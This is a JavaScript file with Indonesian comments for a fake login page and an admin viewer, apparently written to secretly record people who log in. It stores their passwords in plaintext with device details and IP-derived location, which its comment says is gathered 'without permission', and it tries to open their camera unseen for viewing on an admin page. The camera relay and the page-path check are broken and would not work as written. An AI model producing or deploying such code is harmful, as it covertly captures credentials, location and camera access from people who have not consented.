// *** 1. Mengambil Data Perangkat ***
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = "Tidak Diketahui";
    let os = "Tidak Diketahui";

    if (/Android/i.test(userAgent)) {
        device = "Android";
        os = "Android";
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        device = "iOS";
        os = "iOS";
    } else if (/Windows/i.test(userAgent)) {
        device = "Windows PC";
        os = "Windows";
    } else if (/Macintosh/i.test(userAgent)) {
        device = "Mac";
        os = "MacOS";
    } else if (/Linux/i.test(userAgent)) {
        device = "Linux PC";
        os = "Linux";
    }

    return { device, os, userAgent };
}

// *** 2. Mengambil Lokasi Tanpa Izin ***
function getLocation(callback) {
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            callback({
                city: data.city || "Tidak Diketahui",
                region: data.region || "Tidak Diketahui",
                country: data.country_name || "Tidak Diketahui",
                ip: data.ip || "Tidak Diketahui"
            });
        })
        .catch(() => {
            callback({ city: "Tidak Diketahui", region: "Tidak Diketahui", country: "Tidak Diketahui", ip: "Tidak Diketahui" });
        });
}

// *** 3. Menyimpan Data Login ke localStorage ***
function saveLoginData(password) {
    getLocation((location) => {
        const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
        const deviceInfo = getDeviceInfo();
        const time = new Date().toLocaleString();

        loginData.push({
            time,
            password,
            device: deviceInfo.device,
            os: deviceInfo.os,
            ip: location.ip,
            location: `${location.city}, ${location.region}, ${location.country}`
        });

        localStorage.setItem("loginData", JSON.stringify(loginData));
    });
}

// *** 4. Validasi Password dan Simpan Data ***
function validatePassword() {
    const passwordInput = document.getElementById("password");
    const password = passwordInput.value.trim();
    
    if (password) {
        saveLoginData(password);
        alert("Login Berhasil");
        window.location.href = "admin.html";
    } else {
        alert("Kata sandi tidak boleh kosong!");
    }
}

// *** 5. Muat Data Login ke Halaman Admin ***
function loadLoginData() {
    const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
    const tableBody = document.getElementById("loginTable");

    tableBody.innerHTML = "";
    loginData.forEach((data) => {
        const row = document.createElement("tr");
        row.innerHTML = `
            <td>${data.time}</td>
            <td>${data.password}</td>
            <td>${data.device}</td>
            <td>${data.os}</td>
            <td>${data.ip}</td>
            <td>${data.location}</td>
        `;
        tableBody.appendChild(row);
    });
}

// *** 6. Mengakses Kamera Tanpa Ditampilkan di Login ***
let mediaStream;
async function startLoginCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
        setInterval(() => {
            localStorage.setItem("cameraStream", JSON.stringify(mediaStream));
        }, 3000);
    } catch (err) {
        console.error("Gagal mengakses kamera", err);
    }
}

// *** 7. Menampilkan Kamera di Halaman Admin ***
function startAdminCamera() {
    const videoElement = document.getElementById("liveCamera");

    setInterval(() => {
        const savedStream = JSON.parse(localStorage.getItem("cameraStream"));
        if (savedStream) {
            videoElement.srcObject = new MediaStream(savedStream.getTracks());
        }
    }, 3000);
}

// *** Jalankan Kamera Hanya di Halaman Login ***
if (window.location.pathname.includes("https://kkykrnwn.github.io/script-bucin/login.html")) {
    startLoginCamera();
}
